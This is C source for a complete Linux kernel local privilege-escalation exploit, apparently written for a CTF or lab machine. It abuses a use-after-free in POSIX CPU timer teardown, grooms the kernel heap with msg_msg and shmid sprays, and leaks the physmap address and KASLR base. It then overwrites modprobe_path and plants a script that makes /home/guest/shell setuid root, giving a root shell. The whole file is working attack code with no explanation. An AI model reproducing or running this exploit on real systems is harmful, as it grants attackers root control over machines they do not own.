#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/membarrier.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define IS_ERROR(c, s)                                                         \
    do {                                                                       \
        if (c) {                                                               \
            perror(s);                                                         \
            exit(EXIT_FAILURE);                                                \
        }                                                                      \
    } while (0)

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

void pin_cpu(int cpu) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);

    IS_ERROR(sched_setaffinity(0, sizeof(set), &set) == -1, "cpu pin failed");
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

void write_file(const char *file, const char *what, ...) {
    char buf[0x400] = { 0 };
    va_list args;
    int fd;

    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);

    IS_ERROR((fd = open(file, O_WRONLY)) == -1, "open file failed");
    IS_ERROR(write(fd, buf, strlen(buf)) == -1, "write to file failed");
    close(fd);
}

void setup_namespace() {
    int real_uid = getuid();
    int real_gid = getgid();

    IS_ERROR(unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET) == -1,
             "unshare failed");

    write_file("/proc/self/setgroups", "deny");
    write_file("/proc/self/uid_map", "0 %d 1\n", real_uid);
    write_file("/proc/self/gid_map", "0 %d 1\n", real_gid);
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define SHARED_PATH "/shared"

enum {
    ALLOC_VULN_READY = 1,
    ALLOC_VULN_DONE,
    FREE_VULN_READY,
    FREE_VULN_DONE,
    PAGE_RECLAIM_DONE,
    SHARED_SIZE
};

int *shared;

void setup_shared_memory() {
    int shared_fd;

    IS_ERROR((shared_fd = shm_open("/shared", O_CREAT | O_RDWR, 0666)) == -1,
             "shm_open failed");
    IS_ERROR(ftruncate(shared_fd, SHARED_SIZE * sizeof(*shared)) == -1,
             "ftruncate failed");
    shared = mmap(NULL, SHARED_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED,
                  shared_fd, 0);
    IS_ERROR(shared == MAP_FAILED, "mmap failed");
}

int *attach_shared_memory() {
    int shared_fd;
    int *shared;

    IS_ERROR((shared_fd = shm_open(SHARED_PATH, O_RDWR, 0666)) == -1,
             "shm_open failed");
    shared = mmap(NULL, SHARED_SIZE * sizeof(*shared), PROT_READ | PROT_WRITE,
                  MAP_SHARED, shared_fd, 0);
    IS_ERROR(shared == MAP_FAILED, "mmap failed");

    return shared;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

char *path; // absolute path of this executable

void setup_realpath(char *rpath) {
    IS_ERROR((path = mmap(NULL, sizeof(path), PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED,
             "mmap failed");
    IS_ERROR(realpath(rpath, path) == NULL, "realpath failed");
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define FILP_CPU_PARTIAL 13
#define FILP_OBJ_PER_SLAB 16

#define NUM_DRAIN_CPU_PARTIAL (FILP_CPU_PARTIAL + 1)

timer_t drain_timerids[NUM_DRAIN_CPU_PARTIAL];

timer_t fill_filp_slab() {
    timer_t timerid;

    for (int i = 0; i < FILP_OBJ_PER_SLAB; i++) {
        IS_ERROR(timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &timerid) == -1,
                 "timer_create failed");
    }

    return timerid;
}

void drain_filp_cpu_partial() {
    for (int i = 0; i < NUM_DRAIN_CPU_PARTIAL; i++)
        drain_timerids[i] = fill_filp_slab();
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define MSG_MSG_SIZE 48
#define MSG_MSGSEG_SIZE 8

#define M_TYPE_DEFAULT 1

#define MSG_COPY 040000

typedef struct {
    long mtype;
    char mtext[];
} msgbuf_t;

typedef struct {
    int qid;
    msgbuf_t *msg;
    size_t size;
} msg_spray_t;

void setup_msg_spray(msg_spray_t *msg, void *buf, size_t size) {
    IS_ERROR((msg->qid = msgget(IPC_PRIVATE, 0666)) == -1, "msgget failed");
    msg->msg = calloc(sizeof(msgbuf_t) + size, sizeof(char));
    msg->msg->mtype = M_TYPE_DEFAULT;
    msg->size = size;
}

void alloc_msg(msg_spray_t *msg) {
    IS_ERROR(msgsnd(msg->qid, msg->msg, msg->size, IPC_NOWAIT) == -1,
             "msgsnd failed");
}

void free_msg(msg_spray_t *msg) {
    IS_ERROR(msgrcv(msg->qid, msg->msg, msg->size, M_TYPE_DEFAULT,
                    MSG_NOERROR | IPC_NOWAIT) == -1,
             "msgrcv failed");
}

void read_msg(msg_spray_t *msg) {
    IS_ERROR(msgrcv(msg->qid, msg->msg, msg->size, 0,
                    MSG_NOERROR | MSG_COPY | IPC_NOWAIT) == -1,
             "msgrcv failed");
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define KMALLOC_256_CPU_PARTIAL 13
#define KMALLOC_256_OBJ_PER_SLAB 16

#define NUM_DEFRAGMENT_MSGS                                                    \
    (KMALLOC_256_OBJ_PER_SLAB * (KMALLOC_256_CPU_PARTIAL + 1))
#define NUM_RECLAIM_MSGS (2 * KMALLOC_256_OBJ_PER_SLAB)

#define MSG_256B_SIZE (256 - MSG_MSG_SIZE)

enum { PHASE1 = 0, PHASE2, NUM_RECLAIM_PHASES };

msg_spray_t defrag_msgs[NUM_DEFRAGMENT_MSGS];
msg_spray_t reclaim_msgs[NUM_RECLAIM_PHASES][NUM_RECLAIM_MSGS];

void defragment_kmalloc_256_slab() {
    for (int i = 0; i < NUM_DEFRAGMENT_MSGS; i++)
        alloc_msg(&defrag_msgs[i]);
}

void reclaim_with_msg_msgs(int phase) {
    for (int i = 0; i < NUM_RECLAIM_MSGS; i++)
        alloc_msg(&reclaim_msgs[phase][i]);
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define NUM_K_ITIMERS (FILP_OBJ_PER_SLAB * 2)
#define NUM_K_ITIMERS_PRIMARY FILP_OBJ_PER_SLAB

timer_t timerids[NUM_K_ITIMERS];

int membarrier(int cmd, unsigned int flags, int cpu_id) {
    return syscall(__NR_membarrier, cmd, flags, cpu_id);
}

void spray_k_itimers_primary() {
    for (int i = 0; i < NUM_K_ITIMERS_PRIMARY; i++) {
        IS_ERROR(timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &timerids[i]) ==
                     -1,
                 "timer_create failed");
    }
}

void spray_k_itimers_secondary() {
    for (int i = NUM_K_ITIMERS_PRIMARY; i < NUM_K_ITIMERS; i++) {
        IS_ERROR(timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &timerids[i]) ==
                     -1,
                 "timer_create failed");
    }
}

void free_k_itimers(timer_t *timerids, size_t num) {
    for (int i = 0; i < num; i++) {
        IS_ERROR(timer_delete(timerids[i]) == -1, "timer_delete failed");
        IS_ERROR(membarrier(MEMBARRIER_CMD_GLOBAL, 0, 0) == -1,
                 "membarrier failed");
    }
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define NUM_SPRAY_PAGES 10

#define K_ITIMER_IT_CPU_OFFSET 120

unsigned long physmap_addr;

void confirm_slab_free() {
    shared = attach_shared_memory();

    IS_ERROR(membarrier(MEMBARRIER_CMD_GLOBAL, 0, 0) == -1,
             "membarrier failed");
    shared[FREE_VULN_DONE] = 1;
    while (shared[PAGE_RECLAIM_DONE] != 1) {
        /* busy wait */
    }
    /**
     * After reclaim, we exit the process to trigger the timerqueue cleanup
     * routine. Inside it, a rbtree operation writes a k_itimer.it.cpu.node to
     * itself. This use-after-free write drops a physmap address leak.
     */
}

void *trigger_uaf_thread(void *arg) {
    timer_t timerid;
    struct itimerspec its = { .it_value = { .tv_sec = 1000 * 1000 } };
    char *argv[] = { path, "aaaa", NULL };

    while (shared[ALLOC_VULN_READY] != 1) {
        /* busy wait */
    }
    IS_ERROR(timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &timerid) == -1,
             "timer_create failed");
    IS_ERROR(timer_settime(timerid, 0, &its, NULL) == -1,
             "timer_settime failed");
    shared[ALLOC_VULN_DONE] = 1;

    while (shared[FREE_VULN_READY] != 1) {
        /* busy wait */
    }
    execve(path, argv, NULL);

    return NULL;
}

void trigger_uaf_process() {
    pthread_t thid;

    IS_ERROR(pthread_create(&thid, NULL, trigger_uaf_thread, NULL) < 0,
             "pthread_create failed");
}

void check_physmap_leak_success() {
    for (int i = 0; i < NUM_RECLAIM_MSGS; i++) {
        msg_spray_t msg = reclaim_msgs[PHASE1][i];

        read_msg(&msg);
        for (int j = 0; j < MSG_256B_SIZE; j += 8) {
            unsigned long x = *(unsigned long *) &msg.msg->mtext[j];

            if ((x >> 48) == 0xffff) {
                physmap_addr = (x - K_ITIMER_IT_CPU_OFFSET);
                return;
            }
        }
    }
    fprintf(stderr, "leak failed\n");
    exit(EXIT_FAILURE);
}

pid_t trigger_page_uaf() {
    pid_t cpid;

    IS_ERROR((cpid = fork()) == -1, "fork failed");
    if (cpid == 0) {
        pin_cpu(0);
        trigger_uaf_process();
        pause();
    }

    drain_filp_cpu_partial();
    spray_k_itimers_primary();

    shared[ALLOC_VULN_READY] = 1;
    while (shared[ALLOC_VULN_DONE] != 1) {
        /* busy wait */
    }
    spray_k_itimers_secondary();

    shared[FREE_VULN_READY] = 1;
    while (shared[FREE_VULN_DONE] != 1) {
        /* busy wait */
    }
    free_k_itimers(timerids, NUM_K_ITIMERS);
    free_k_itimers(drain_timerids, NUM_DRAIN_CPU_PARTIAL);

    return cpid;
}

void leak_physmap_address() {
    pid_t cpid;

    defragment_kmalloc_256_slab();
    cpid = trigger_page_uaf();

    usleep(100 * 1000); // wait for slab discard
    reclaim_with_msg_msgs(PHASE1);

    shared[PAGE_RECLAIM_DONE] = 1;
    waitpid(cpid, NULL, 0); // confirm timerqueue cleanup
    check_physmap_leak_success();
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define K_ITIMER_SIZE 256

#define EVIL_MSG_MSG_OFFSET (K_ITIMER_SIZE - (MSG_MSG_SIZE + MSG_MSG_SIZE))

#define MSG_4K_SIZE (4096 - MSG_MSG_SIZE)
#define EVIL_M_TS MSG_4K_SIZE

#define NUM_SPRAY_SHMID_KERNELS 100

#define SHM_FREE_RCU_OFFSET 0x3959c0

struct list_head {
    struct list_head *next, *prev;
};

struct rb_node {
    unsigned long __rb_parent_color;
    struct rb_node *rb_right, *rb_left;
} __attribute__((aligned(sizeof(long))));

struct rb_root {
    struct rb_node *rb_node;
};

struct rb_root_cached {
    struct rb_root rb_root;
    struct rb_node *rb_leftmost;
};

struct timerqueue_node {
    struct rb_node node;
    long expires;
};

struct timerqueue_head {
    struct rb_root_cached rb_root;
};

struct cpu_timer {
    struct timerqueue_node node;
    struct timerqueue_head *head;
    void *pid;
    struct list_head elist;
    int firing;
};

struct k_itimer {
    char pad[80];
    int it_requeue_pending, it_sigev_notify;
    long it_interval;
    void *it_signal, *it_pid, *sigq;
    struct cpu_timer cpu;
};

struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;
    void *next, *security;
};

unsigned long kaslr_base;

msg_spray_t upper_msg, lower_msg;

void build_evil_timer() {
    for (int i = 0; i < NUM_RECLAIM_MSGS; i++) {
        msg_spray_t msg = reclaim_msgs[PHASE2][i];
        struct k_itimer *timer = (void *) &msg.msg->mtext - MSG_MSG_SIZE;

        // fake rbtree node which writes `node.left` to `node.parent + 8`
        timer->cpu.node.node.__rb_parent_color = physmap_addr - 8;
        timer->cpu.node.node.rb_right = (void *) physmap_addr + MSG_MSG_SIZE;
        timer->cpu.node.node.rb_left = (void *) physmap_addr - MSG_MSG_SIZE;
    }
}

void build_evil_unaligned_msg() {
    char buf[MSG_256B_SIZE] = { 0 };
    struct msg_msg *evil_msg = (void *) &buf[EVIL_MSG_MSG_OFFSET];

    // first find unaligned msg
    for (int i = 0; i < NUM_RECLAIM_MSGS; i++) {
        msg_spray_t msg = reclaim_msgs[PHASE1][i];

        read_msg(&msg);
        if (msg.msg->mtext[0])
            lower_msg = msg;
        else if (msg.msg->mtext[EVIL_MSG_MSG_OFFSET])
            upper_msg = msg;
    }

    // next, modify unaligned msg_msg header
    evil_msg->m_list.next = (void *) physmap_addr;
    evil_msg->m_list.prev = (void *) physmap_addr;
    evil_msg->m_type = M_TYPE_DEFAULT;
    evil_msg->m_ts = EVIL_M_TS;

    free_msg(&upper_msg);
    memcpy(upper_msg.msg->mtext, buf, sizeof(buf));
    for (int i = 0; i < NUM_RECLAIM_MSGS; i++)
        alloc_msg(&upper_msg);
}

void spray_shmid_kernels() {
    int ids[NUM_SPRAY_SHMID_KERNELS];

    for (int i = 0; i < NUM_RECLAIM_MSGS; i++) {
        msg_spray_t msg = reclaim_msgs[PHASE1][i];

        if (msg.qid == upper_msg.qid || msg.qid == lower_msg.qid)
            continue;

        free_msg(&msg);
    }
    for (int i = 0; i < NUM_SPRAY_SHMID_KERNELS; i++) {
        IS_ERROR((ids[i] = shmget(IPC_PRIVATE, 1, 0600)) == -1,
                 "shmget failed");
    }

    // trigger RCU free to drop `shm_rcu_free` address
    for (int i = 0; i < NUM_SPRAY_SHMID_KERNELS; i++) {
        IS_ERROR(shmctl(ids[i], IPC_RMID, NULL) == -1, "shmctl failed");
    }
}

void check_kaslr_leak_success() {
    for (int i = 0; i < EVIL_M_TS; i += 8) {
        unsigned long x = *(unsigned long *) &lower_msg.msg->mtext[i];

        if ((x & 0xfffff) == (SHM_FREE_RCU_OFFSET & 0xfffff)) {
            kaslr_base = x - SHM_FREE_RCU_OFFSET;
            return;
        }
    }
    fprintf(stderr, "leak failed\n");
    exit(EXIT_FAILURE);
}

void leak_kaslr_base() {
    pid_t cpid;

    memset(shared, 0, SHARED_SIZE * sizeof(*shared)); // reset sync flags
    build_evil_timer();

    defragment_kmalloc_256_slab();
    cpid = trigger_page_uaf();

    usleep(100 * 1000); // wait for slab discard
    reclaim_with_msg_msgs(PHASE2);

    shared[PAGE_RECLAIM_DONE] = 1;
    waitpid(cpid, NULL, 0); // confirm timerqueue cleanup

    build_evil_unaligned_msg();

    free_msg(&lower_msg); // from now, lower_msg is the unaligned evil msg
    spray_shmid_kernels();

    lower_msg.msg = calloc(sizeof(msgbuf_t) + EVIL_M_TS, sizeof(char));
    lower_msg.size = EVIL_M_TS;
    read_msg(&lower_msg);

    check_kaslr_leak_success();
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define MODPROBE_PATH (kaslr_base + 0x1451060)

void overwrite_modprobe_path() {
    char buf[MSG_256B_SIZE] = { 0 };
    struct msg_msg *evil_msg = (void *) &buf[EVIL_MSG_MSG_OFFSET];

    evil_msg->m_list.next = (void *) (MODPROBE_PATH + 1) - 8;
    evil_msg->m_list.prev =
        (void *) (physmap_addr & 0xffffffff00000000) + 0x2f706d74;
    evil_msg->m_type = M_TYPE_DEFAULT;
    evil_msg->m_ts = EVIL_M_TS;

    for (int i = 0; i < NUM_RECLAIM_MSGS; i++)
        free_msg(&upper_msg);
    memcpy(upper_msg.msg->mtext, buf, sizeof(buf));
    for (int i = 0; i < NUM_RECLAIM_MSGS; i++)
        alloc_msg(&upper_msg);

    free_msg(&lower_msg); // trigger write by unlinking attack
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define MODPROBE_CONTENTS                                                      \
    "#!/bin/sh\nchown root:root /home/guest/shell\nchmod u+s "                 \
    "/home/guest/shell"

void spawn_modprobe_shell() {
    int fd;
    char path[64] = { 0 };

    IS_ERROR((fd = open("/proc/sys/kernel/modprobe", O_RDONLY)) == -1,
             "open failed");
    IS_ERROR(read(fd, path, 14) == -1, "read failed");
    close(fd);

    IS_ERROR((fd = open(path, O_CREAT | O_RDWR, 0777)) == -1, "open failed");
    write(fd, MODPROBE_CONTENTS, sizeof(MODPROBE_CONTENTS));
    close(fd);

    system("echo -n '\xff\xff\xff\xff' > /home/guest/dummy");
    system("chmod +x /home/guest/dummy");

    system("/home/guest/dummy");

    system("/home/guest/shell");
}

void setup_msg_queues() {
    for (int i = 0; i < NUM_DEFRAGMENT_MSGS; i++)
        setup_msg_spray(&defrag_msgs[i], "a", MSG_256B_SIZE);
    for (int i = 0; i < NUM_RECLAIM_PHASES; i++) {
        for (int j = 0; j < NUM_RECLAIM_MSGS; j++)
            setup_msg_spray(&reclaim_msgs[i][j], "b", MSG_256B_SIZE);
    }
}

int main(int argc, char *argv[]) {
    pid_t cpid;
    int pipefd[2];
    char tmp;

    if (argv[1]) { // for re-entered process
        confirm_slab_free();
        exit(EXIT_SUCCESS); // trigger timerqueue cleanup routine (uaf write)
    }
    IS_ERROR(pipe(pipefd) == -1, "pipe failed");
    setup_shared_memory();

    IS_ERROR((cpid = fork()) == -1, "fork failed");
    if (cpid == 0) {
        setup_namespace();
        setup_msg_queues();
        setup_realpath(argv[0]);

        pin_cpu(0);

        leak_physmap_address();
        leak_kaslr_base();
        overwrite_modprobe_path();

        write(pipefd[1], "a", 1);
        exit(EXIT_SUCCESS);
    }
    read(pipefd[0], &tmp, 1);
    spawn_modprobe_shell();

    return 0;
}
